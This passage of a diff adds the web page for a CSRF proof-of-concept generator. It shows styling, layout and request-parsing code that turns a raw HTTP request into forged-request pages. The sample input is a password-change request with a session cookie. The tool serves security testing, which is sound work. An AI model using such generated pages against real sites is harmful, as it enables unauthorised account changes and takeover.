@@ -1,0 +1,1751 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>CSRF PoC Generator - Free Alternative to Burp Suite Pro</title>
+<link href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@400;500;600&family=Cabinet+Grotesk:wght@400;500;700;800&display=swap" rel="stylesheet"/>
+<link rel="icon" href="favicon.png" type="image/png">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+
+:root{
+  --bg:#070710;
+  --glass:rgba(255,255,255,0.04);
+  --glass-border:rgba(255,255,255,0.08);
+  --accent:#e040fb;
+  --accent-dim:rgba(224,64,251,0.15);
+  --cyan:#00e5ff;
+  --cyan-dim:rgba(0,229,255,0.12);
+  --green:#00e676;
+  --green-dim:rgba(0,230,118,0.12);
+  --text:#f0f0ff;
+  --text2:#9090b0;
+  --text3:#50506a;
+  --mono:'Geist Mono',monospace;
+  --sans:'Cabinet Grotesk','Inter',sans-serif;
+}
+
+body{
+  font-family:var(--sans);
+  background:var(--bg);
+  color:var(--text);
+  height:100vh;
+  display:flex;
+  flex-direction:column;
+  overflow:hidden;
+}
+
+body::before{
+  content:'';position:fixed;inset:0;
+  background:
+    radial-gradient(ellipse 80% 60% at 10% 0%,rgba(224,64,251,0.09) 0%,transparent 60%),
+    radial-gradient(ellipse 60% 50% at 90% 100%,rgba(0,229,255,0.07) 0%,transparent 60%);
+  pointer-events:none;z-index:0;
+}
+body::after{
+  content:'';position:fixed;inset:0;
+  background-image:
+    linear-gradient(rgba(255,255,255,0.018) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(255,255,255,0.018) 1px,transparent 1px);
+  background-size:48px 48px;
+  pointer-events:none;z-index:0;
+}
+
+/* HEADER */
+header{
+  position:relative;z-index:10;
+  display:flex;align-items:center;gap:14px;
+  padding:16px 24px;
+  border-bottom:1px solid var(--glass-border);
+  background:rgba(7,7,16,0.85);
+  backdrop-filter:blur(24px);
+  flex-shrink:0;
+}
+.logo{
+  width:38px;height:38px;border-radius:10px;
+  background:linear-gradient(135deg,#e040fb,#7c4dff);
+  display:flex;align-items:center;justify-content:center;font-size:18px;
+  box-shadow:0 0 24px rgba(224,64,251,0.5);flex-shrink:0;
+}
+.header-left{
+  display:flex;align-items:center;gap:14px;
+}
+.logo-text h1{
+  font-size:16px;font-weight:800;letter-spacing:-.2px;
+  background:linear-gradient(90deg,#f0f0ff,#c090ff);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  display:inline;
+}
+.byline{
+  font-size:12px;font-weight:500;
+  color:var(--accent);
+  margin-left:6px;
+  letter-spacing:.5px;
+}
+.title-row{
+  display:flex;align-items:baseline;
+}
+.subtitle{
+  font-family:var(--mono);font-size:10px;color:var(--text3);margin-top:2px;
+}
+.header-right{
+  display:flex;gap:8px;margin-left:auto;
+}
+.pill{
+  font-family:var(--mono);font-size:10px;font-weight:500;
+  padding:4px 11px;border-radius:99px;letter-spacing:.8px;border:1px solid;
+}
+.pill-g{color:var(--green);border-color:rgba(0,230,118,.3);background:var(--green-dim);}
+.pill-c{color:var(--cyan);border-color:rgba(0,229,255,.3);background:var(--cyan-dim);}
+
+/* History toggle button */
+.btn-history-toggle{
+  display:flex;align-items:center;gap:6px;
+  font-family:var(--mono);font-size:11px;font-weight:600;
+  padding:6px 12px;border-radius:8px;
+  border:1px solid var(--glass-border);
+  background:rgba(255,255,255,0.05);color:var(--text2);
+  cursor:pointer;transition:all .18s;margin-left:6px;
+}
+.btn-history-toggle:hover{background:rgba(0,229,255,0.1);color:var(--cyan);border-color:rgba(0,229,255,0.3);}
+.history-badge{
+  font-size:9px;font-weight:700;
+  padding:1px 5px;border-radius:99px;
+  background:var(--accent);color:#fff;
+}
+
+/* History Sidebar */
+.history-overlay{
+  position:fixed;inset:0;z-index:998;
+  background:rgba(0,0,0,0.4);
+  backdrop-filter:blur(2px);
+}
+.history-sidebar{
+  position:fixed;top:0;right:0;bottom:0;z-index:999;
+  width:320px;max-width:85vw;
+  background:var(--bg);
+  border-left:1px solid var(--glass-border);
+  display:flex;flex-direction:column;
+  transition:transform .25s cubic-bezier(.34,1.56,.64,1);
+  box-shadow:-10px 0 40px rgba(0,0,0,0.4);
+}
+.history-header{
+  display:flex;align-items:center;gap:10px;
+  padding:16px 20px;
+  border-bottom:1px solid var(--glass-border);
+  background:rgba(255,255,255,0.02);
+  flex-shrink:0;
+}
+.history-header h3{
+  font-size:13px;font-weight:600;color:var(--text1);
+  display:flex;align-items:center;gap:8px;
+  flex:1;margin:0;
+}
+.history-close{
+  background:none;border:none;
+  font-size:22px;color:var(--text3);cursor:pointer;
+  line-height:1;padding:0 4px;
+}
+.history-close:hover{color:var(--text1);}
+.history-list{
+  flex:1;overflow-y:auto;
+  padding:12px;
+}
+.history-empty{
+  text-align:center;padding:40px 20px;
+  color:var(--text3);font-size:12px;
+  font-family:var(--mono);
+}
+.history-item{
+  background:rgba(255,255,255,0.03);
+  border:1px solid var(--glass-border);
+  border-radius:10px;
+  padding:12px 14px;margin-bottom:8px;
+  transition:background .15s;
+}
+.history-item:hover{background:rgba(255,255,255,0.06);}
+.history-item-header{
+  display:flex;align-items:center;gap:8px;
+  margin-bottom:6px;
+}
+.history-method{
+  font-family:var(--mono);font-size:9px;font-weight:700;
+  padding:2px 6px;border-radius:4px;
+  background:rgba(0,229,255,0.12);color:var(--cyan);
+  text-transform:uppercase;
+}
+.history-host{
+  font-family:var(--mono);font-size:11px;color:var(--text2);
+  flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
+}
+.history-time{
+  font-size:10px;color:var(--text3);
+  margin-bottom:10px;
+}
+.history-actions{
+  display:flex;gap:6px;
+}
+.history-actions button{
+  font-family:var(--mono);font-size:10px;font-weight:600;
+  padding:4px 10px;border-radius:6px;border:1px solid var(--glass-border);
+  background:rgba(255,255,255,0.05);color:var(--text2);cursor:pointer;
+  transition:all .15s;
+}
+.history-actions .btn-restore:hover{
+  background:rgba(0,230,118,0.1);color:var(--green);border-color:rgba(0,230,118,0.3);
+}
+.history-actions .btn-delete:hover{
+  background:rgba(255,82,82,0.1);color:var(--red);border-color:rgba(255,82,82,0.3);
+}
+.history-footer{
+  padding:12px;border-top:1px solid var(--glass-border);
+  flex-shrink:0;
+}
+
+/* WORKSPACE */
+.workspace{
+  position:relative;z-index:1;flex:1;
+  display:grid;grid-template-columns:1fr 1fr;
+  grid-template-rows:1fr auto;
+  overflow:hidden;
+}
+
+/* PANE */
+.pane{display:flex;flex-direction:column;overflow:hidden;border-right:1px solid var(--glass-border);}
+.pane:last-child{border-right:none;}
+
+.pane-head{
+  display:flex;align-items:center;gap:10px;
+  padding:12px 20px;
+  border-bottom:1px solid var(--glass-border);
+  background:rgba(255,255,255,0.02);flex-shrink:0;
+}
+.pane-label{font-family:var(--mono);font-size:10px;font-weight:600;letter-spacing:1.8px;text-transform:uppercase;color:var(--text3);}
+
+.sdot{width:7px;height:7px;border-radius:50%;flex-shrink:0;}
+.sdot-a{background:var(--accent);box-shadow:0 0 8px var(--accent);animation:blink 2.5s ease-in-out infinite;}
+.sdot-g{background:var(--green);box-shadow:0 0 8px var(--green);opacity:.3;}
+.sdot-g.on{opacity:1;animation:blink 2.5s ease-in-out infinite;}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.5}}
+
+
+/* INPUT */
+#requestInput{
+  flex:1;background:transparent;border:none;outline:none;resize:none;
+  color:var(--text);font-family:var(--mono);font-size:12.5px;line-height:1.8;
+  padding:18px 22px;caret-color:var(--accent);
+}
+#requestInput::placeholder{color:var(--text3);font-style:italic;}
+#requestInput::-webkit-scrollbar{width:4px;}
+#requestInput::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.07);border-radius:2px;}
+
+/* OUTPUT EDITOR (contenteditable) */
+#pocEditor{
+  flex:1;background:transparent;border:none;outline:none;
+  color:var(--text);font-family:var(--mono);font-size:12.5px;line-height:1.8;
+  padding:18px 22px;caret-color:var(--cyan);display:none;
+  white-space:pre;overflow-y:auto;
+}
+#pocEditor:empty:before{content:attr(placeholder);color:var(--text3);font-style:italic;white-space:pre;}
+#pocEditor::-webkit-scrollbar{width:4px;}
+#pocEditor::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.07);border-radius:2px;}
+
+/* BOTTOM BAR */
+.bottom-bar{
+  grid-column:1/-1;
+  display:flex;align-items:center;gap:10px;
+  padding:12px 20px;
+  border-top:1px solid var(--glass-border);
+  background:rgba(7,7,16,0.9);
+  backdrop-filter:blur(20px);
+  flex-shrink:0;
+}
+
+/* Protocol toggle */
+.proto-switch{
+  display:flex;background:rgba(255,255,255,0.04);
+  border:1px solid var(--glass-border);border-radius:8px;padding:3px;gap:2px;flex-shrink:0;
+}
+.proto-opt{
+  font-family:var(--mono);font-size:11px;font-weight:600;
+  padding:5px 13px;border-radius:6px;border:none;
+  background:transparent;color:var(--text3);cursor:pointer;
+  transition:all .18s;letter-spacing:.4px;
+}
+.proto-opt.active{
+  background:rgba(224,64,251,0.18);color:#d090f0;
+  box-shadow:0 0 0 1px rgba(224,64,251,0.3);
+}
+
+/* Mode toggle */
+.mode-switch{
+  display:flex;background:rgba(255,255,255,0.04);
+  border:1px solid var(--glass-border);border-radius:8px;padding:3px;gap:2px;flex-shrink:0;
+}
+.mode-opt{
+  font-family:var(--mono);font-size:11px;font-weight:600;
+  padding:5px 13px;border-radius:6px;border:none;
+  background:transparent;color:var(--text3);cursor:pointer;
+  transition:all .18s;letter-spacing:.4px;
+}
+.mode-opt.active{
+  background:rgba(0,229,255,0.18);color:#80e5ff;
+  box-shadow:0 0 0 1px rgba(0,229,255,0.3);
+}
+
+.sep{width:1px;height:22px;background:var(--glass-border);flex-shrink:0;}
+
+/* Buttons */
+.btn{
+  display:inline-flex;align-items:center;gap:7px;
+  font-family:var(--mono);font-size:11px;font-weight:600;
+  padding:8px 16px;border-radius:9px;border:1px solid;
+  cursor:pointer;transition:all .18s;letter-spacing:.3px;white-space:nowrap;flex-shrink:0;
+}
+.btn svg{width:13px;height:13px;flex-shrink:0;}
+
+.btn-gen{
+  background:linear-gradient(135deg,#e040fb,#7c4dff);
+  border-color:transparent;color:#fff;
+  box-shadow:0 0 18px rgba(224,64,251,.35),0 2px 8px rgba(0,0,0,.4);
+  margin-left:auto;
+}
+.btn-gen:hover{box-shadow:0 0 30px rgba(224,64,251,.55),0 2px 12px rgba(0,0,0,.5);transform:translateY(-1px);}
+.btn-gen:active{transform:none;}
+
+.btn-copy{background:var(--cyan-dim);border-color:rgba(0,229,255,.25);color:var(--cyan);}
+.btn-copy:hover{background:rgba(0,229,255,.2);box-shadow:0 0 14px rgba(0,229,255,.2);}
+
+.btn-save{background:var(--green-dim);border-color:rgba(0,230,118,.25);color:var(--green);}
+.btn-save:hover{background:rgba(0,230,118,.2);box-shadow:0 0 14px rgba(0,230,118,.2);}
+
+.btn-clear{background:transparent;border-color:var(--glass-border);color:var(--text3);}
+.btn-clear:hover{background:var(--glass);color:var(--text2);border-color:rgba(255,255,255,.14);}
+
+.btn-test{background:transparent;border-color:var(--glass-border);color:var(--text3);}
+.btn-test:hover{background:rgba(255,158,66,.1);color:#ff9e42;border-color:rgba(255,158,66,.3);}
+
+.btn-share{background:transparent;border-color:var(--glass-border);color:var(--text3);}
+.btn-share:hover{background:rgba(224,64,251,.1);color:#e040fb;border-color:rgba(224,64,251,.3);}
+
+.btn[disabled]{opacity:.3;cursor:not-allowed;pointer-events:none;}
+
+/* MODAL */
+.modal-overlay{
+  position:fixed;inset:0;z-index:1000;
+  background:rgba(0,0,0,0.6);
+  backdrop-filter:blur(4px);
+  display:flex;align-items:center;justify-content:center;
+}
+.modal-card{
+  background:#1e1e2e;
+  border:1px solid var(--glass-border);
+  border-radius:12px;
+  width:520px;max-width:90vw;
+  box-shadow:0 20px 60px rgba(0,0,0,0.5);
+  overflow:hidden;
+}
+.modal-header{
+  display:flex;align-items:center;gap:10px;
+  padding:16px 20px;
+  border-bottom:1px solid var(--glass-border);
+  background:rgba(255,255,255,0.03);
+}
+.modal-icon{
+  width:28px;height:28px;
+  display:flex;align-items:center;justify-content:center;
+  background:rgba(255,107,53,0.15);
+  border-radius:6px;
+}
+.modal-header h3{
+  font-size:14px;font-weight:600;color:var(--text1);
+  flex:1;margin:0;
+}
+.modal-close{
+  background:none;border:none;
+  font-size:22px;color:var(--text3);cursor:pointer;
+  line-height:1;padding:0 4px;
+}
+.modal-close:hover{color:var(--text1);}
+.modal-body{
+  padding:20px;
+}
+.modal-body p{
+  font-size:12px;color:var(--text2);margin:0 0 16px;line-height:1.5;
+}
+.modal-url-row{
+  display:flex;gap:8px;
+}
+.modal-url-input{
+  flex:1;
+  background:rgba(0,0,0,0.3);
+  border:1px solid var(--glass-border);
+  border-radius:8px;
+  padding:8px 12px;
+  font-family:var(--mono);
+  font-size:11px;
+  color:var(--text2);
+  outline:none;
+}
+.modal-footer{
+  display:flex;justify-content:flex-end;gap:8px;
+  padding:12px 20px 16px;
+}
+.btn-copy-url{
+  font-family:var(--mono);font-size:11px;font-weight:600;
+  padding:6px 14px;border-radius:6px;border:1px solid rgba(0,229,255,.4);
+  background:rgba(0,229,255,.1);color:var(--cyan);cursor:pointer;
+}
+.btn-copy-url:hover{background:rgba(0,229,255,.2);}
+.btn-modal-open{
+  font-family:var(--mono);font-size:11px;font-weight:600;
+  padding:8px 16px;border-radius:8px;border:1px solid rgba(0,230,118,.4);
+  background:rgba(0,230,118,.1);color:var(--green);cursor:pointer;
+}
+.btn-modal-open:hover{background:rgba(0,230,118,.2);}
+.btn-modal-close{
+  font-family:var(--mono);font-size:11px;font-weight:600;
+  padding:8px 16px;border-radius:8px;border:1px solid var(--glass-border);
+  background:rgba(255,255,255,0.05);color:var(--text2);cursor:pointer;
+}
+.btn-modal-close:hover{background:rgba(255,255,255,0.1);}
+
+/* TOAST */
+#toast{
+  position:fixed;bottom:76px;left:50%;
+  transform:translateX(-50%) translateY(14px);
+  font-family:var(--mono);font-size:11.5px;font-weight:500;
+  padding:9px 20px;border-radius:99px;
+  background:rgba(12,12,24,0.97);border:1px solid;
+  backdrop-filter:blur(20px);z-index:999;opacity:0;
+  transition:all .22s cubic-bezier(.34,1.56,.64,1);
+  pointer-events:none;white-space:nowrap;
+}
+#toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
+#toast.ok{color:var(--green);border-color:rgba(0,230,118,.4);box-shadow:0 0 18px rgba(0,230,118,.15);}
+#toast.err{color:#ff5370;border-color:rgba(255,83,112,.4);box-shadow:0 0 18px rgba(255,83,112,.15);}
+
+/* HINT */
+.hint{font-family:var(--mono);font-size:10px;color:var(--text3);margin-left:auto;display:flex;align-items:center;gap:4px;}
+kbd{
+  font-family:var(--mono);font-size:9px;padding:2px 5px;
+  border-radius:4px;background:rgba(255,255,255,0.06);
+  border:1px solid rgba(255,255,255,0.12);color:var(--text2);
+}
+
+/* Screen reader only content */
+.sr-only {
+  position: absolute;
+  width: 1px;
+  height: 1px;
+  padding: 0;
+  margin: -1px;
+  overflow: hidden;
+  clip: rect(0, 0, 0, 0);
+  white-space: nowrap;
+  border: 0;
+}
+
+/* Focus styles for better keyboard navigation */
+*:focus {
+  outline: 2px solid var(--cyan);
+  outline-offset: 2px;
+}
+
+.btn:focus, .proto-opt:focus, .vt-btn:focus {
+  outline: 2px solid var(--accent);
+  outline-offset: 2px;
+  box-shadow: 0 0 8px rgba(224, 64, 251, 0.4);
+}
+
+textarea:focus {
+  outline: 2px solid var(--accent);
+  outline-offset: 1px;
+}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-left">
+    <div class="logo">⚡</div>
+    <div class="logo-text">
+      <div class="title-row">
+        <h1>CSRF PoC Generator</h1>
+        <span class="byline">by KrazePlanet</span>
+      </div>
+      <p class="subtitle">Free alternative to Burp Suite Professional</p>
+    </div>
+  </div>
+  <div class="header-right">
+    <span class="pill pill-g">FREE</span>
+    <span class="pill pill-c">OPEN SOURCE</span>
+    <button class="btn-history-toggle" id="btnHistory" onclick="toggleHistorySidebar()" aria-label="Open PoC History" tabindex="0">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" width="16" height="16" aria-hidden="true">
+        <polyline points="12 8 12 12 16 14"/>
+        <circle cx="12" cy="12" r="10"/>
+      </svg>
+      History
+      <span class="history-badge" id="historyBadge" style="display:none;">0</span>
+    </button>
+  </div>
+</header>
+
+<div class="workspace">
+
+  <div class="pane">
+    <div class="pane-head">
+      <div class="sdot sdot-a"></div>
+      <span class="pane-label">HTTP Request</span>
+    </div>
+    <textarea id="requestInput" spellcheck="false" 
+placeholder="POST /1307.php?action=settings HTTP/1.1
+Host: 134.122.126.74
+Content-Length: 59
+Cache-Control: max-age=0
+Accept-Language: en-GB,en;q=0.9
+Origin: http://134.122.126.74
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://134.122.126.74/1307.php?action=settings
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=jlc9pdrqninbfurubu10h718gl
+Connection: keep-alive
+
+new_password=praveen%401234&confirm_password=praveen%401234"
+              aria-label="HTTP Request Input"
+              aria-describedby="input-help"
+              tabindex="1"></textarea>
+  </div>
+
+  <div class="pane">
+    <div class="pane-head">
+      <div class="sdot sdot-g" id="outDot"></div>
+      <span class="pane-label">CSRF PoC Form</span>
+    </div>
+    <div id="pocEditor" contenteditable="true"
+         placeholder="Generated PoC will appear here — fully editable..."
+         aria-label="CSRF PoC Editor"
+         aria-describedby="editor-help"
+         tabindex="2"></div>
+    <div id="input-help" class="sr-only">Paste a raw HTTP request including method, path, headers, and body</div>
+    <div id="editor-help" class="sr-only">Edit the generated CSRF PoC HTML code</div>
+  </div>
+
+  <!-- Single unified action bar -->
+  <div class="bottom-bar">
+
+    <div class="proto-switch">
+      <button class="proto-opt active" id="pHTTP"  onclick="setProto('http')">HTTP</button>
+      <button class="proto-opt"        id="pHTTPS" onclick="setProto('https')">HTTPS</button>
+    </div>
+
+    <div class="sep"></div>
+
+    <!-- PoC Mode Selector -->
+    <div class="mode-switch">
+      <button class="mode-opt active" id="mForm"  onclick="setMode('form')">Form</button>
+      <button class="mode-opt"        id="mXHR"   onclick="setMode('xhr')">XHR</button>
+      <button class="mode-opt"        id="mJS"    onclick="setMode('js')">JS</button>
+    </div>
+
+    <div class="sep"></div>
+
+    <button class="btn btn-clear" onclick="clearInput()" 
+            aria-label="Clear input" tabindex="4">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" aria-hidden="true">
+        <polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/>
+      </svg>
+      Clear
+    </button>
+
+
+    <button class="btn btn-copy" id="btnCopy"    onclick="copyPoC()"    disabled 
+            aria-label="Copy PoC to clipboard" tabindex="5">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" aria-hidden="true">
+        <rect x="9" y="9" width="13" height="13" rx="2"/>
+        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+      </svg>
+      Copy
+    </button>
+
+    <button class="btn btn-save" id="btnSave"    onclick="saveHTML()"   disabled 
+            aria-label="Save PoC as HTML file" tabindex="6">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" aria-hidden="true">
+        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+        <polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>
+      </svg>
+      Save HTML
+    </button>
+
+    <button class="btn btn-test" id="btnTest"    onclick="showBrowserModal()" disabled 
+            aria-label="Test PoC in browser" tabindex="7">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" aria-hidden="true">
+        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"/>
+        <line x1="8" y1="21" x2="16" y2="21"/>
+        <line x1="12" y1="17" x2="12" y2="21"/>
+      </svg>
+      Test in browser
+    </button>
+
+    <button class="btn btn-share" id="btnShare"    onclick="showShareModal()" disabled 
+            aria-label="Generate shareable link" tabindex="8">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" aria-hidden="true">
+        <circle cx="18" cy="5" r="3"/>
+        <circle cx="6" cy="12" r="3"/>
+        <circle cx="18" cy="19" r="3"/>
+        <line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/>
+        <line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/>
+      </svg>
+      Share
+    </button>
+
+    <span class="hint">Auto-generates as you type</span>
+  </div>
+</div>
+
+<div id="toast"></div>
+
+<!-- Browser Test Modal -->
+<div id="browserModal" class="modal-overlay" style="display:none;">
+  <div class="modal-card">
+    <div class="modal-header">
+      <div class="modal-icon">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#ff6b35" stroke-width="2.2">
+          <rect x="2" y="3" width="20" height="14" rx="2" ry="2"/>
+          <line x1="8" y1="21" x2="16" y2="21"/>
+          <line x1="12" y1="17" x2="12" y2="21"/>
+        </svg>
+      </div>
+      <h3>Show response in browser</h3>
+      <button class="modal-close" onclick="closeBrowserModal()" aria-label="Close modal">&times;</button>
+    </div>
+    <div class="modal-body">
+      <p>To show this response in your browser, copy the URL below and paste into a browser.</p>
+      <div class="modal-url-row">
+        <input type="text" id="browserUrl" class="modal-url-input" readonly>
+        <button class="btn btn-copy-url" onclick="copyBrowserUrl()">Copy</button>
+      </div>
+    </div>
+    <div class="modal-footer">
+      <button class="btn btn-modal-open" onclick="openBrowserUrl()">Open in browser</button>
+      <button class="btn btn-modal-close" onclick="closeBrowserModal()">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- Share Link Modal -->
+<div id="shareModal" class="modal-overlay" style="display:none;">
+  <div class="modal-card">
+    <div class="modal-header">
+      <div class="modal-icon" style="background:rgba(224,64,251,0.15);">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#e040fb" stroke-width="2.2">
+          <circle cx="18" cy="5" r="3"/>
+          <circle cx="6" cy="12" r="3"/>
+          <circle cx="18" cy="19" r="3"/>
+          <line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/>
+          <line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/>
+        </svg>
+      </div>
+      <h3>Generate Shareable Link</h3>
+      <button class="modal-close" onclick="closeShareModal()" aria-label="Close modal">&times;</button>
+    </div>
+    <div class="modal-body">
+      <p>Generate a shareable link that you can send to anyone. <strong style="color:#ff9e42;">Links expire after 1 hour and are permanently deleted from our servers.</strong></p>
+      <div class="modal-url-row">
+        <input type="text" id="shareUrl" class="modal-url-input" readonly placeholder="Click Generate to create link...">
+        <button class="btn btn-copy-url" id="btnGenLink" onclick="generateShareLink()">Generate</button>
+      </div>
+      <div id="shareLoading" style="display:none;text-align:center;padding:12px;">
+        <span style="color:var(--cyan);font-family:var(--mono);font-size:12px;">Generating link...</span>
+      </div>
+    </div>
+    <div class="modal-footer">
+      <button class="btn btn-modal-open" onclick="copyShareUrl()">Copy Link</button>
+      <button class="btn btn-modal-close" onclick="closeShareModal()">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- History Sidebar -->
+<div id="historyOverlay" class="history-overlay" style="display:none;" onclick="toggleHistorySidebar()"></div>
+<div id="historySidebar" class="history-sidebar" style="transform:translateX(100%);">
+  <div class="history-header">
+    <h3>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" width="16" height="16">
+        <polyline points="12 8 12 12 16 14"/>
+        <circle cx="12" cy="12" r="10"/>
+      </svg>
+      PoC History
+    </h3>
+    <button class="history-close" onclick="toggleHistorySidebar()" aria-label="Close history">&times;</button>
+  </div>
+  <div class="history-list" id="historyList">
+    <div class="history-empty">No history yet. Generate a PoC to save it here.</div>
+  </div>
+  <div class="history-footer">
+    <button class="btn btn-modal-close" onclick="clearAllHistory()">Clear all</button>
+  </div>
+</div>
+
+<script>
+let proto = 'http';
+let mode = 'form';
+let generatedPoC = '';
+
+// Cache DOM elements
+const elements = {
+  requestInput: null,
+  pocEditor: null,
+  outDot: null,
+  btnCopy: null,
+  btnSave: null,
+  pHTTP: null,
+  pHTTPS: null,
+  mForm: null,
+  mXHR: null,
+  mJS: null,
+  btnTest: null,
+  btnShare: null,
+  browserModal: null,
+  browserUrl: null,
+  shareModal: null,
+  shareUrl: null,
+  btnHistory: null,
+  historySidebar: null,
+  historyOverlay: null,
+  historyList: null,
+  historyBadge: null,
+  toast: null
+};
+
+// Initialize DOM cache
+document.addEventListener('DOMContentLoaded', () => {
+  Object.keys(elements).forEach(key => {
+    const element = document.getElementById(key);
+    if (element) {
+      elements[key] = element;
+    } else {
+      console.warn(`Element not found: ${key}`);
+    }
+  });
+});
+
+function setProto(p) {
+  proto = p;
+  if (elements.pHTTP && elements.pHTTPS) {
+    elements.pHTTP.classList.toggle('active',  p==='http');
+    elements.pHTTPS.classList.toggle('active', p==='https');
+  }
+  
+  // Regenerate PoC if there's existing content
+  if (elements.requestInput && elements.requestInput.value.trim()) {
+    generatePoC();
+  }
+}
+
+function setMode(m) {
+  mode = m;
+  if (elements.mForm && elements.mXHR && elements.mJS) {
+    elements.mForm.classList.toggle('active', m==='form');
+    elements.mXHR.classList.toggle('active', m==='xhr');
+    elements.mJS.classList.toggle('active', m==='js');
+  }
+  
+  // Regenerate PoC if there's existing content
+  if (elements.requestInput && elements.requestInput.value.trim()) {
+    generatePoC();
+  }
+}
+
+function clearInput() {
+  if (elements.requestInput) {
+    elements.requestInput.value = '';
+  }
+  
+  // Clear the output as well
+  clearOutput();
+  
+  // Focus back to input
+  if (elements.requestInput) {
+    elements.requestInput.focus();
+  }
+}
+
+function setReady(on) {
+  ['btnCopy','btnSave','btnTest','btnShare'].forEach(id => {
+    const element = elements[id];
+    if (element) {
+      on ? element.removeAttribute('disabled') : element.setAttribute('disabled','');
+    }
+  });
+  
+  if (elements.outDot) {
+    elements.outDot.style.opacity = on ? '1' : '.3';
+    elements.outDot.classList.toggle('on', on);
+  }
+}
+
+function parseRequest(raw) {
+  if (!raw || typeof raw !== 'string') {
+    toast('Invalid request input','err');
+    return null;
+  }
+  
+  const lines = raw.trim().split('\n');
+  if (lines.length < 2) {
+    toast('Request too short - need at least method line and headers','err');
+    return null;
+  }
+  
+  const m = lines[0].trim().match(/^(POST|GET|PUT|PATCH|DELETE)\s+(\S+)/i);
+  if (!m) {
+    toast('Invalid request line - expected METHOD path format','err');
+    return null;
+  }
+  
+  const method = m[1].toUpperCase();
+  let path = m[2];
+  let host='', bodyStart=-1;
+  let contentType = '';
+  let headers = [];
+  let cookies = '';
+  let csrfToken = null;
+  let urlParams = [];
+  
+  for (let i=1; i<lines.length; i++) {
+    if (!lines[i].trim()) { bodyStart=i+1; break; }
+    const line = lines[i];
+    const ci = line.indexOf(':');
+    if (ci > 0) {
+      const key = line.slice(0, ci).trim().toLowerCase();
+      const value = line.slice(ci+1).trim();
+      
+      if (key === 'host') {
+        host = value;
+        if (!host || host.includes('<') || host.includes('>')) {
+          toast('Invalid Host header detected','err');
+          return null;
+        }
+      } else if (key === 'content-type') {
+        contentType = value.toLowerCase();
+      } else if (key === 'cookie') {
+        cookies = value;
+      } else if (key.startsWith('x-') || key === 'origin' || key === 'referer') {
+        headers.push({name: line.slice(0, ci).trim(), value});
+      }
+    }
+  }
+  
+  if (!host) {
+    toast('Host header required','err');
+    return null;
+  }
+  
+  // Parse URL parameters for GET requests
+  if (method === 'GET') {
+    const qIndex = path.indexOf('?');
+    if (qIndex > -1) {
+      const query = path.slice(qIndex + 1);
+      path = path.slice(0, qIndex);
+      query.split('&').forEach(p => {
+        const e = p.indexOf('=');
+        if (e >= 0) {
+          urlParams.push({
+            name: decodeURIComponent(p.slice(0, e)).replace(/[<>"']/g, ''),
+            value: decodeURIComponent(p.slice(e+1)).replace(/[<>"']/g, '')
+          });
+        }
+      });
+    }
+  }
+  
+  const body = bodyStart > 0 ? lines.slice(bodyStart).join('\n').trim() : '';
+  let params = [];
+  let rawBody = '';
+  let multipart = null;
+  
+  if (body) {
+    if (contentType.includes('multipart/form-data')) {
+      // Parse multipart data
+      multipart = parseMultipart(body, contentType);
+    } else if (contentType.includes('application/json')) {
+      rawBody = body;
+      try { JSON.parse(body); } catch(e) {}
+    } else if (contentType.includes('application/xml') || contentType.includes('text/xml')) {
+      rawBody = body;
+    } else {
+      // Standard form data
+      body.split('&').forEach(p => {
+        const e = p.indexOf('=');
+        if (e >= 0) {
+          const name = decodeURIComponent(p.slice(0, e));
+          const value = decodeURIComponent(p.slice(e+1));
+          if (name && !name.includes('<') && !name.includes('>')) {
+            params.push({
+              name: name.replace(/[<>"']/g, ''),
+              value: value.replace(/[<>"']/g, '')
+            });
+            // Detect CSRF tokens
+            const lowerName = name.toLowerCase();
+            if (lowerName.includes('csrf') || lowerName.includes('token') || lowerName.includes('nonce')) {
+              csrfToken = { name, value };
+            }
+          }
+        }
+      });
+    }
+  }
+  
+  return {
+    method,
+    action: `${proto}://${host}${path}`,
+    host,
+    path,
+    params,
+    rawBody,
+    multipart,
+    contentType,
+    headers,
+    cookies,
+    csrfToken,
+    urlParams
+  };
